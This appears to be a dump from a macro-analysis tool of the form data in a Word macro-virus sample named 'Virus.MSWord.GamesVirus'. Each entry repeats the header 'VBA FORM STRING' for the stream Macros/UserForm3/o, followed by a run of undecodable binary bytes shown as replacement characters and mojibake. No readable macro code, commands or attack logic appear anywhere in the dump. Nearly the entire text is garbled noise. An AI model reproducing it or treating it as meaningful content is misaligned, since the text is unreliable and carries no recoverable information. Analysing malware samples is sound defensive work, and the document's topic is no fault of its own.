- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��鳳�����鳶�靝�Zd��u�������������������������������������������y�W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������Wqqqq�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���oqu�������t�����tt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����EMZEVFFVZ���������ǿ��������۳����������������Ͳ��д��ž�����t��tss����q���������鳳��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������鳳����鷊QdZ�������|��������������������������������������yq����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������qq�W������Wuqu�����ﶥ�Z���������������t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��EWP�MZuMPIBZ���������ۿ����������������������������Ͳ��а����ͬ�����q������Z����������ೳ�������鳳��������鳀Q\Z��������������������������������������������Z�q�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������W�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�tquq����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t���t�������t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����tEMZMPP)NUo���������ſ������������������������������������ͬ�����Ͳ�Ь���������ͳ������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������鳳����UQiZ�t�����������������������������������������}�y�W����������������������������������������qquu���������靝�������t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��EWMZM/3LBBZ����������β����������������г�����������Ž�Ǭէ�ͷ���ͧ�ͧ��o����ӵ�鳳����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鳳��鳳靳������tUQ[Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�����������������������������������������yoq����������������������������f\Atuu���������tq�t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ﶝ�������EE��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tttEEMW)IPB+LmZ��δ������ҽ�����������������ߵ������ž�ŴΡ��������������t���������鳳ﳳ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����鳳��������ujQ\m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������}�}����y�oqW���������������������������d8\w�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�����������Wqqt����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����E����tE�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���ttMuM3PPPVQ�Ž��������ɴ�����ʯɿؽ��������ﳵ�����ž©�����q��������sv}�������鳳�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鳳������������oU9[Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������oo����������������������������n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�cf<ffJtuuq��������uqu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ﶆ�������E�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tMI*+L5GNJSB9.CKUo��ɽ���ǿ��ư�������������������鳵���внοͬ���qo͝�q��w�����ͳԳ��ﳳ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������鳳ZQ9[y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������qq��������������������������v\cwff!ff%ff7LWWW�������tuqu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E�����E����t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uMMMMMIOOBIB96TV�m������ǿ�ɽֿ������������յ������������ο�Ӹ��o��}o�����q�ͥ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������tjL+[m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����o�������|����������}�~���y�������yqqo����������������������������n<<��`f<18-f6:Q�t���������tWW�����������Et
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tWWMWPFBFJ2J<.C6Hj�j��ɿο����ǲ����������������������д���ǡ��ttMt��t�t�t������t��t�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������o�o�������󠡠�������������scO�wwwwcfC@�ff:�f81!fmtq��鷳�������tt�����E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tWtWqqPBYP*;J644C5jY�������ɿ����ڿ��͵�����������������а��ο��*M�鶶tt�tttttt��t�t�t�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������q�����������������}��������o�tu����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������ww�=]fwnff4#�ww��cf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$"f��q�q���������ﳝtt�����E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��MuF3PIIBN+LG64C]Y}Z��������������ɲŬӳ����ܿ����дӲ�в���ǆ+�I����ttt�����t�t���t�tt�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o��svvn����wwfn��wffwwfww�=@1nf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fwwwwwwfS��������WW�����uW�qoq�E��E�E��t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ttMFPII)II+JJ9LLSU^Z�����������ٰ�ɽ«��Ӳ�����������Ъ����͚��BZttt�ttts���t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����t�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������y������yo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ty�s��w���fw���ssds~~��d�ff�6-""-\�wnfww�����������������qqqu����t��tE���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EtMWFVBB+++LLKJJ=YZbq�����ǿǿ����ѿ����Ĳ�����������ı��ಱǶt�����uuuW��uutus�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ttj�t��z������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������y������y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uZ��d��Z�~qo��}}ooZ�qq}w�C8"87%@68C:�������ﳅ�������t�����t��E������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tWWMWP/LQL5LKKKNNYUY���ο�ǿ���ǿ�ѿ���Ŵ���������വ�����ɿ�t�����uuWqsoZWuW��ttt�tt��s������qy������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
幹���������y�o�y������qq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W���n�tW�oy�}s�qoooqqttqt�u��w�f�f�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
酅�����t�t�t�t�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uEEMMWPPI*BB+L+LLB/mr�Ӱ�����ǿ���ɿ���Ų��������в���ʯ�ɿ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qu�ql�qWtq�Wu��u����t�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������y�oqo�y���y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tty�Z�f��aq�y��e~�oquttt�ot����tn�ww������酶�鶶�����ttt��t����t��u��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F���tMttWF3PPFWPWqqQ���Ų�����ǿ���ɿ���Ӳ�����������������ο�u��ŷ�qq�qs����q����e���utt�o��vs��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s~��~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
庣e~e���}��yq�q�ooo��oq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tZ�j��ns��qoy��}v}�oootttuyZuu��tuqod�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���酶������t��uttt�t�t���u�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�E�EMW((FF)PPPFPPPWj��������ǿ����ڿξ�ͬе�ۿ�����ʯڲ���ǡ�q�q��qq�qq��oooqq�q�uuuuutt�ttt��t�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������oqo�qqq�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�yy�~~���q���ln�Z}�o��uy}}qo���qZ�����鶅��������鷵Wq�tttuu�q�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tWMFPm�FBFKM/VFP*(OJZUy�δ����ο���������������ɽ����ɿ͵������qqqVVVomm�ym�ooooVoqqquWu�tt�tt�t�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������yqqqqq�t�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tq��}j�dq~��d~�v�qt�oz~rZy�tqo���酅���������qWqooqqqqqt��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3MPP�LLLMVLNA;2NM==9SmZ��а�������ίɽ������ү�ο�������Ŭǫ�mKUUNNNSSSSSSNSSNNUYKKKLQQ+B//VIIIFF((MMMEMEEEEttEE�IJW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������oqqoq����yW��u��uqZ�Zuzyz}vv��v�zo�o}vs����q������鷷�罹��槥�qWt���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3WI/�5AK3VOO9C+S(IHG<+j���ı������ʿ������Ŵ���������ά��ο��������������/y�o/yo����鳳�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������o����q��鷵���t�oZ�}���sl���nwYoq��vv}Zqy���酶�����������ӧq����������酶�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�QoW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FW33EIIINEKNG<2S(=O2HPZ����в�ǲ��ξŲ౾Ų��ɽ�ǿ������ɿ����qqqq�����Z�������������������ȳ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�慅�����M3W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������t�����������������������qt�tW���������qZ���uyqs`������yy~d�������������������q������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�zq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WFMF3MI+59J99<5NA.J;ANSq���������蛜�����Ų��������������ǿǿ�����Է��榥���馳��������Ȯ���̭��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+5Qt��Mtt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������t�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������~~���u���������鳳��W�WtWqoqWqqq����ye�wsz����������������醅W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t�q�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MWM3(IQK9;J<:664664=6J=Uq±������ΰ���οΰ�������̿ɽ���ǿ����ɿ��ť�鹥��������ѿ�u��΅�t���泅�E=OZq�W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���͵��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ﳳ�uWWqqoy~�uuoauq�qWq~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������樨��o�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tqq����ﶅ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tWWWWWFI)+B*B+5K(=62=BPLZ���С����Ь���ɰ����������ɿ���ǿǿ���������Ǭ�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ঀ��Z��o͵�quuutttt����텅t��;OW��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�����ͧ������������������������o����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�鶷����e}���q���q�����酅����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������o����q�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EEWyyq��������q�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MMWuWWW3I+I+LLI(J.C2=AKW
-------------------------------------------------------------------------------
